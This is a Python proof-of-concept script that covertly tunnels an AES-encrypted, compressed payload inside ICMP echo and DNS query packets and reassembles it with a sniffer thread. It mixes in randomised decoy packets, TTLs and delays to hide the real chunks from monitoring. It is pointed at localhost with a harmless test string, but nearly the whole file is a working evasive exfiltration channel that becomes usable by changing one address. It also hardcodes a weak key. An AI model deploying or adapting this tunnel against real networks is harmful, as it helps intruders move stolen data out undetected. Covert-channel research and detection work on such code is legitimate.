import os
import random
import string
import time
import hashlib
import threading
import zlib
from scapy.all import IP, ICMP, UDP, DNS, DNSQR, send, sniff, conf
from scapy.packet import Raw
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Configuration
SECRET_KEY = "mysecretkey12345"  # Key for encryption and decryption
received_chunks = {}  # Dictionary to hold received chunks
stop_sniffer = threading.Event()  # Event to signal the sniffer to stop
dict_lock = threading.Lock()  # Lock for thread-safe access to received_chunks
DNS_DOMAIN = "example.com"  # Example domain for DNS queries
dns_servers = ["127.0.0.1"]  # DNS server IP for testing

# Encryption and Compression function
def encrypt_and_compress_payload(payload):
    # Compress the payload
    compressed_payload = zlib.compress(payload.encode())
    # Encrypt the compressed payload
    key = hashlib.sha256(SECRET_KEY.encode()).digest()  # Derive a 256-bit key from the secret key
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(compressed_payload, AES.block_size))
    return cipher.iv + ct_bytes

# Decryption and Decompression function
def decrypt_and_decompress_payload(encrypted_payload):
    try:
        key = hashlib.sha256(SECRET_KEY.encode()).digest()  # Derive a 256-bit key from the secret key
        iv = encrypted_payload[:16]
        ct = encrypted_payload[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        compressed_payload = unpad(cipher.decrypt(ct), AES.block_size)
        # Decompress the payload
        decompressed_payload = zlib.decompress(compressed_payload)
        return decompressed_payload.decode()
    except ValueError as e:
        raise ValueError(f"Decryption failed due to incorrect data format: {e}")
    except Exception as e:
        raise Exception(f"Decryption failed: {e}")

# Dummy ICMP Traffic Sender
def send_dummy_icmp(target_ip):
    # Generate random data for the dummy payload
    dummy_payload = ''.join(random.choices(string.ascii_letters + string.digits, k=32)).encode()
    sequence_number = random.randint(0, 65535)  # Random sequence number
    ttl_value = random.randint(30, 128)  # Random TTL value

    # Create and send the dummy ICMP packet
    packet = IP(dst=target_ip, ttl=ttl_value) / ICMP(type=8, seq=sequence_number) / Raw(load=dummy_payload)
    send(packet, verbose=False)
    print(f"[Dummy ICMP] Sent dummy ICMP packet with seq {sequence_number}")

# Dummy DNS Traffic Sender
def send_dummy_dns(domain):
    # Generate random data for the dummy payload
    dummy_payload = ''.join(random.choices(string.ascii_letters + string.digits, k=32)).encode()
    random_label = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    query_domain = f"{random_label}.{domain}"
    dns_server = random.choice(dns_servers)

    # Create and send the dummy DNS packet
    packet = IP(dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_domain)) / Raw(load=dummy_payload)
    send(packet, verbose=False)
    print(f"[Dummy DNS] Sent dummy DNS query for {query_domain}")

# ICMP Payload Sender with Dummy Traffic
def send_icmp_payload_with_dummy(payload, target_ip):
    chunk_size = 32
    payload_chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]

    for i, chunk in enumerate(payload_chunks):
        sequence_number = i  # Use a consistent sequence number for ordering
        ttl_value = random.randint(30, 128)  # Random TTL value

        # Add an identifier to distinguish payload packets
        identifier = b'PAYLOAD'  # 7-byte identifier
        packet_payload = identifier + chunk

        # Send the actual payload packet
        packet = IP(dst=target_ip, ttl=ttl_value) / ICMP(type=8, seq=sequence_number) / Raw(load=packet_payload)
        send(packet, verbose=False)
        print(f"[Sender - ICMP] Sent payload packet with sequence number {sequence_number}")

        # Send a random number of dummy ICMP packets
        num_dummy_icmp = random.randint(1, 3)
        for _ in range(num_dummy_icmp):
            send_dummy_icmp(target_ip)
            time.sleep(random.uniform(0.05, 0.2))  # Random delay between dummy packets

        # Optional sleep before sending the next payload packet
        time.sleep(random.uniform(0.1, 0.5))

# DNS Payload Sender with Dummy Traffic
def send_dns_payload_with_dummy(payload, domain):
    chunk_size = 32
    payload_chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]

    for i, chunk in enumerate(payload_chunks):
        # Include an identifier in the query name to distinguish payload packets
        random_label = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
        query_domain = f"{random_label}-PAYLOAD-{i}.{domain}"
        dns_server = random.choice(dns_servers)

        # Send the actual payload packet
        packet = IP(dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_domain)) / Raw(load=chunk)
        send(packet, verbose=False)
        print(f"[Sender - DNS] Sent payload DNS query: {query_domain}")

        # Send a random number of dummy DNS packets
        num_dummy_dns = random.randint(1, 3)
        for _ in range(num_dummy_dns):
            send_dummy_dns(domain)
            time.sleep(random.uniform(0.05, 0.2))  # Random delay between dummy packets

        # Optional sleep before sending the next payload packet
        time.sleep(random.uniform(0.1, 0.5))

# Packet Sniffer and Reassembler
def packet_sniffer():
    def icmp_sniffer(packet):
        if stop_sniffer.is_set():
            return

        if packet.haslayer(ICMP) and packet.haslayer(Raw):  # Capture all ICMP packets with data
            try:
                payload_data = packet[Raw].load
                seq_num = packet[ICMP].seq

                # Check for the 'PAYLOAD' identifier
                if payload_data.startswith(b'PAYLOAD'):
                    actual_payload = payload_data[len(b'PAYLOAD'):]
                    print(f"[Sniffer - ICMP] Payload packet received with sequence number {seq_num}")

                    with dict_lock:
                        if seq_num not in received_chunks:
                            received_chunks[seq_num] = actual_payload
                            print(f"[Sniffer - ICMP] Stored payload chunk: {actual_payload}")
                else:
                    # This is a dummy packet
                    print("[Sniffer - ICMP] Dummy ICMP packet received. Ignoring.")

            except Exception as e:
                print(f"[Sniffer - ICMP] Error decoding ICMP packet: {e}")

    def dns_sniffer(packet):
        if stop_sniffer.is_set():
            return

        if packet.haslayer(DNS) and packet.haslayer(Raw):  # Capture all DNS packets with data
            try:
                payload_data = packet[Raw].load
                query_name = packet[DNS].qd.qname.decode().strip('.')

                # Check for the 'PAYLOAD' identifier in the query name
                if 'PAYLOAD' in query_name and DNS_DOMAIN in query_name:
                    print(f"[Sniffer - DNS] Payload DNS query received: {query_name}")
                    index = int(query_name.split('-PAYLOAD-')[1].split('.')[0])

                    with dict_lock:
                        if index not in received_chunks:
                            received_chunks[index] = payload_data
                            print(f"[Sniffer - DNS] Stored payload chunk: {payload_data}")
                else:
                    # This is a dummy packet
                    print("[Sniffer - DNS] Dummy DNS packet received. Ignoring.")

            except Exception as e:
                print(f"[Sniffer - DNS] Error decoding DNS packet: {e}")

    # Start sniffing ICMP and DNS packets
    def process_packet(pkt):
        icmp_sniffer(pkt)
        dns_sniffer(pkt)

    sniff(filter="icmp or udp port 53",
          prn=process_packet,
          store=0,
          iface="Software Loopback Interface 1",  # Change to your correct interface
          stop_filter=lambda x: stop_sniffer.is_set())

# Run Payload Transmission
if __name__ == "__main__":
    target_ip = "127.0.0.1"
    text_payload = "This is my hardcoded payload that I am tunneling over."

    # Encrypt and compress the payload before transmission
    encrypted_payload = encrypt_and_compress_payload(text_payload)

    # Start the sniffer thread
    print("[Main] Starting sniffer thread...")
    sniffer_thread = threading.Thread(target=packet_sniffer, daemon=True)
    sniffer_thread.start()

    # Give the sniffer time to initialize
    time.sleep(2)
    print("[Main] Sniffer thread started. Sending payload with dummy traffic...")

    # Send the payload via ICMP with dummy traffic
    send_icmp_payload_with_dummy(encrypted_payload, target_ip)
    # Optionally, send the payload via DNS with dummy traffic
    send_dns_payload_with_dummy(encrypted_payload, DNS_DOMAIN)

    print("[Main] Payload transmission complete.")

    # Wait a bit to ensure all packets are processed
    time.sleep(5)

    # Signal the sniffer to stop
    stop_sniffer.set()

    # Attempt to reassemble and decrypt the payload after sending is complete
    with dict_lock:
        if received_chunks:
            try:
                reassembled_payload = b''.join(
                    [received_chunks[key] for key in sorted(received_chunks.keys()) if key is not None])
                # Decrypt and decompress the payload
                decrypted_payload = decrypt_and_decompress_payload(reassembled_payload)
                print(f"[Receiver] Final Reassembled and Decrypted Payload: {decrypted_payload}")
            except ValueError as ve:
                print(f"[Receiver] Error due to incorrect data format: {ve}")
            except Exception as e:
                print(f"[Receiver] Error reassembling or decrypting payload: {e}")
        else:
            print("[Receiver] No packets were received.")

    # Wait for the sniffer thread to finish
    sniffer_thread.join(timeout=5)

    print("[Main] Sniffer thread has been stopped. Exiting program.")
